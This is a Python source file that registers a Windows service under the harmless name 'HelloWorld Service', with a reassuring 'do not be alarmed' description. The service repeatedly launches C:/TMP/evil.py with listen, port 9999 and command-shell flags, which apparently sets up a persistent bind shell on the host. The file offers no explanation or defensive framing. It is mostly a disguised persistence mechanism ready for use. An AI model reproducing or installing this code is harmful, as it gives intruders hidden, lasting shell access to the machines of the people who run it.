import win32serviceutil
import win32service
import win32event
import servicemanager
import socket
import time
import subprocess
import signal
import os


class HelloWorldSvc (win32serviceutil.ServiceFramework):
    _svc_name_ = "HelloWorldService"
    _svc_display_name_ = "HelloWorld Service"
    _svc_description_ = "This is a test of the emergency broadcast system.  Do not be alarmed."

    process = {}


    def __init__(self,args):
        win32serviceutil.ServiceFramework.__init__(self,args)
        self.stop_event = win32event.CreateEvent(None,0,0,None)
        socket.setdefaulttimeout(60)
        self.stop_requested = False

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.stop_event)
        self.stop_requested = True

    def SvcDoRun(self):
        servicemanager.LogMsg(
            servicemanager.EVENTLOG_INFORMATION_TYPE,
            servicemanager.PYS_SERVICE_STARTED,
            (self._svc_name_,'')
        )
        self.main()


    def main(self):
        # Simulate a main loop
        for i in range(0,50):
            if self.stop_requested:
                break
            # Call Python script
            command = ['C:/Python27/python.exe','C:/TMP/evil.py', '-l', '-p', '9999', '-c']
            if not self.process:
                self.process = subprocess.Popen(command, subprocess.CREATE_NEW_PROCESS_GROUP)
            time.sleep(5)

        return

if __name__ == '__main__':
    win32serviceutil.HandleCommandLine(HelloWorldSvc)